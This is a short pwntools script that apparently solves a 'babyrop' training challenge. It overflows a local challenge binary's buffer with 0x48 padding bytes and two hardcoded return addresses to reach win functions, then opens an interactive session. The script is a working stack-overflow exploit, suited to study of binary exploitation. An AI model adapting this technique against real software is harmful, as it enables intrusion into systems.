from pwn import * 

elf = ELF("/challenge/babyrop_level2.0")
io = elf.process()

win_add1 = p64(int("401ffd", 16))
win_add2 = p64(int("4020aa", 16))

buff_offset = int("48", 16)

p = b'A'*(buff_offset) + win_add1 + win_add2

io.sendline(p)

io.interactive()
